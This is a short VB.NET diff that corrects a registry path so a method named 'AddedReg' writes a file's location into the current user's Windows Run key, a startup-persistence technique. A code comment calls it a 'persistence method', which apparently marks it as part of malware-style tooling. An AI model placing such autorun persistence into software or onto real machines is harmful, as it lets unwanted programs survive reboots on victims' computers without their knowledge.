@@ -33,7 +33,7 @@ Public Class Main
 
     Public Shared Sub AddedReg(ByVal LOC As String)
         'You have to create your own persistence method, I can't share mine here.
-        Try : Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\Run\CurrentVersion\").SetValue(IO.Path.GetFileName(LOC), LOC) : Catch : End Try
+        Try : Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Run\").SetValue(IO.Path.GetFileName(LOC), LOC) : Catch : End Try
     End Sub
 End Class
 
